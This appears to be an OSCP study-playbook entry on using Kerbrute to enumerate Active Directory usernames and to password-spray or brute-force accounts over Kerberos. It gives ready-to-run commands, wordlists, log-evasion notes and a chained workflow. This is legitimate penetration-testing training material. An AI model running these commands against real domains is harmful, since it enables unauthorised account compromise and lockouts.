title: Kerbrute — Username Enum + Password Spray via Kerberos
body:
Kerbrute uses Kerberos pre-authentication (AS-REQ) to validate usernames and passwords without generating Windows event log entries that traditional SMB-based methods produce. Two modes you'll use constantly:

  userenum   — confirm which usernames exist in the domain (no credentials needed)
  passwordspray — try one password against many users (creds = need username list)

Why it beats other tools for OSCP:
  - Two UDP frames per attempt (AS-REQ + AS-REP) → fast, quiet
  - Works without ANY credentials (unlike nxc which often needs a valid account)
  - Cross-platform — same binary on Kali and Windows targets (great when stuck on a foothold)
  - Doesn't trigger 'failed logon' Event ID 4625 like SMB-based spraying does

This is your go-to tool when you've identified an AD domain (port 88 open) but have no credentials yet. Combine with a smart wordlist and you'll have a valid username list inside 5 minutes.
cmd:
# ══════════════════════════════════════════════════
# INSTALL
# ══════════════════════════════════════════════════
# If you ran the oscp-toolkit setup.sh, it's already at:
#   ~/oscp-tools/recon/kerbrute_linux_amd64
# Otherwise:
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# ══════════════════════════════════════════════════
# MODE 1 — USERNAME ENUMERATION (no creds needed)
# ══════════════════════════════════════════════════
# Validates which usernames exist by asking the KDC for a TGT.
# Valid users return AS-REP, invalid users return KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN.

kerbrute userenum \
  --dc $dc_ip \
  -d corp.com \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Output looks like:
#   [+] VALID USERNAME: dave@corp.com
#   [+] VALID USERNAME: jeff@corp.com

# Quieter (just valid hits, no errors):
kerbrute userenum --dc $dc_ip -d corp.com users.txt -o valid_users.txt

# Threading (default 10, bump for speed):
kerbrute userenum --dc $dc_ip -d corp.com users.txt -t 50

# ══════════════════════════════════════════════════
# MODE 2 — PASSWORD SPRAY (need usernames first)
# ══════════════════════════════════════════════════
# Tries ONE password against a list of users.
# Critical: respect the lockout policy. Default AD = 5 failures.
# Spray 1 password, wait 30 min, spray next password.

# Single password against username list:
kerbrute passwordspray --dc $dc_ip -d corp.com valid_users.txt 'Welcome2024!'

# Password list against single user (NOT recommended — locks the account):
# DON'T do this in production; on labs you can:
kerbrute bruteuser --dc $dc_ip -d corp.com /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt dave

# Username:Password combo file (one pair per line):
# user1:pass1
# user2:pass2
kerbrute bruteforce --dc $dc_ip -d corp.com combo.txt

# ══════════════════════════════════════════════════
# WORDLISTS THAT WORK
# ══════════════════════════════════════════════════
# Default usernames (Kali):
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt          # huge, slow
/usr/share/seclists/Usernames/Names/names.txt                            # common first names
/usr/share/seclists/Usernames/top-usernames-shortlist.txt                # 17 lines, exam-day fast

# AD naming convention permutations (THE one to know about):
git clone https://github.com/insidetrust/statistically-likely-usernames.git
# Has: jsmith.txt (first-initial-last), john.smith.txt (first.last),
# john_smith.txt (first_last), smith.txt (last name only), etc.
# Pick the format matching the org's domain naming.

# Build custom from OSINT / scraped names:
echo 'John Smith\nJane Doe\nBob Wilson' | awk '{print tolower(substr($1,1,1) $2)}' > custom.txt
# → jsmith, jdoe, bwilson

# ══════════════════════════════════════════════════
# COMMON FAILURE MODES
# ══════════════════════════════════════════════════
# 'KDC_ERR_C_PRINCIPAL_UNKNOWN' for every user:
#   Wrong domain name. Check nmap's LDAP output for 'Domain: x.y.z'.
#   Try both Pre-Win2000 (CORP) and FQDN (corp.com) — most need FQDN.
#
# 'connection refused' on port 88:
#   Wrong --dc IP, or DC firewalled Kerberos. Try a different DC if multi-DC.
#
# 'Clock skew too great':
#   Kerberos requires <5 min clock skew. Sync to DC:
#     sudo ntpdate $dc_ip
#     OR: sudo timedatectl set-time "$(date -d "$(sudo ntpdate -q $dc_ip 2>/dev/null | grep -oP 'offset \K\S+') sec" '+%Y-%m-%d %H:%M:%S')"
#
# All passwords return 'success' (false positives):
#   You're hitting a honeypot or an account with no pre-auth. Verify with nxc or evil-winrm.
#
# Lockout panic:
#   Lab accounts auto-reset on revert. On real engagements, ALWAYS check
#   the lockout policy first. nxc smb $dc_ip --pass-pol  (after you have one cred).

# ══════════════════════════════════════════════════
# CHAINING — typical workflow
# ══════════════════════════════════════════════════
# 1. Enumerate domain name via nmap (LDAP fingerprint):
#    nmap -p 389 --script ldap-rootdse $dc_ip
#
# 2. Build a username list — start tiny, expand if empty:
#    cat /usr/share/seclists/Usernames/Names/names.txt | head -2000 > users.txt
#
# 3. Enumerate valid usernames:
#    kerbrute userenum --dc $dc_ip -d corp.com users.txt -o valid.txt
#
# 4. Spray a contextual password (seasonal/company-themed):
#    kerbrute passwordspray --dc $dc_ip -d corp.com valid.txt 'Spring2024!'
#    Common winners on labs: Password1, Welcome1, Summer2024, <CompanyName>1
#
# 5. Got a hit? Move to authenticated enumeration:
#    nxc smb $dc_ip -u dave -p 'Password1'
#    → see ad_loggedon_playbook for next steps
warn: Userenum is genuinely quiet (no Windows event log entries from invalid attempts). passwordspray IS logged as failed logons — and locks accounts after the policy threshold. ALWAYS pull the lockout policy with `nxc smb $dc_ip --pass-pol` once you have any cred, before spraying. On exam day, lockouts cost you the box.

choices.label: Got valid usernames — now spray a password
Got a credential — start authenticated enumeration
Got hash from AS-REP roast — crack it
